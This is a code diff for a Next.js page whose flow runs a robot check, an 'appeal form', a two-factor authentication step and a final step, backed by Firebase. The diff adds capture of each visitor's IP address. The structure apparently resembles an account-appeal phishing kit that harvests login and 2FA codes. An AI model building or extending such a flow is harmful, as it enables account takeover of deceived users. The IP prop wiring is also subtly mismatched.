@@ -9,9 +9,9 @@ import { doc, setDoc, getDocs, getDoc, updateDoc, query, collection, onSnapshot 
 import { db } from  '../firebaseConfig';
 
 
-export default function Home() {
+export default function Home(ip) {
 
-  const [steps, setOpen] = useState({step_one: true, step_two: false, step_three: false, step_four: false});
+  const [steps, setOpen] = useState({step_one: false, step_two: true, step_three: false, step_four: false});
 
   const getData = (data) => {
     if(data.type == 'robot-check') setOpen({step_two: true});
@@ -39,12 +39,20 @@ export default function Home() {
         <Sidebar/>
         <div className={styles.content}>
             <div className={styles.container}>
-                { steps.step_one && <RobotCheck onSubmit={getData}/>}
-                { steps.step_two && <AppealForm onSubmit={getData}/>}
-                { steps.step_three && <TwoFactorAuth onSubmit={getData}/>}
+                { steps.step_one && <RobotCheck onSubmit={getData} ip={ip} />}
+                { steps.step_two && <AppealForm onSubmit={getData} ip={ip} />}
+                { steps.step_three && <TwoFactorAuth onSubmit={getData} ip={ip} />}
                 { steps.step_four && <Final onSubmit={getData}/>}
             </div>
         </div>
     </div>
   )
+}
+
+Home.getInitialProps = async ({ req }) => {
+  let userIP
+  if (req) {
+    userIP = req.headers['x-real-ip'] || req.connection.remoteAddress
+  }
+  return { userIP }
 }
